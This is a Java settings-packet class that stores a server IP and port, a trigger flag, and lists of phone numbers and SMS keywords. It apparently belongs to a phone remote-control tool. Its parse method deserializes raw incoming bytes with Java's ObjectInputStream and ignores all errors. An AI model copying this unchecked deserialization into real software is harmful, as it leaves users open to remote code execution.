package Packet;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.ArrayList;


public class PreferencePacket implements Packet, Serializable {

	private static final long serialVersionUID = 4434667156231031L;

	String ip;
	int port;
	boolean waitTrigger;
	ArrayList<String> phoneNumberCall;
	ArrayList<String> phoneNumberSMS;
	ArrayList<String> keywordSMS;

	public PreferencePacket() {

	}

	public PreferencePacket(String ip, int port, boolean wait, ArrayList<String> phones,
		ArrayList<String> sms, ArrayList<String> kw) {
		this.ip = ip;
		this.port = port;
		this.waitTrigger = wait;
		this.phoneNumberCall = phones;
		this.phoneNumberSMS = sms;
		this.keywordSMS = kw;
	}

	public byte[] build() {
		try {
			final ByteArrayOutputStream bos = new ByteArrayOutputStream();
			final ObjectOutputStream out = new ObjectOutputStream(bos);
			out.writeObject(this);
			return bos.toByteArray();
		} catch (final IOException e) {
			return null;
		}
	}

	public String getIp() {
		return this.ip;
	}

	public ArrayList<String> getKeywordSMS() {
		return this.keywordSMS;
	}

	public ArrayList<String> getPhoneNumberCall() {
		return this.phoneNumberCall;
	}

	public ArrayList<String> getPhoneNumberSMS() {
		return this.phoneNumberSMS;
	}

	public int getPort() {
		return this.port;
	}

	public boolean isWaitTrigger() {
		return this.waitTrigger;
	}

	public void parse(byte[] packet) {
		final ByteArrayInputStream bis = new ByteArrayInputStream(packet);
		ObjectInputStream in;
		try {
			in = new ObjectInputStream(bis);
			final PreferencePacket p = (PreferencePacket) in.readObject();
			this.setIp(p.getIp());
			this.setPort(p.getPort());
			this.setWaitTrigger(p.isWaitTrigger());
			this.setPhoneNumberCall(p.getPhoneNumberCall());
			this.setPhoneNumberSMS(p.getPhoneNumberSMS());
			this.setKeywordSMS(p.getKeywordSMS());
		} catch (final Exception e) {}
	}

	public void setIp(String ip) {
		this.ip = ip;
	}

	public void setKeywordSMS(ArrayList<String> keywordSMS) {
		this.keywordSMS = keywordSMS;
	}

	public void setPhoneNumberCall(ArrayList<String> phoneNumberCall) {
		this.phoneNumberCall = phoneNumberCall;
	}

	public void setPhoneNumberSMS(ArrayList<String> phoneNumberSMS) {
		this.phoneNumberSMS = phoneNumberSMS;
	}

	public void setPort(int port) {
		this.port = port;
	}

	public void setWaitTrigger(boolean waitTrigger) {
		this.waitTrigger = waitTrigger;
	}
}
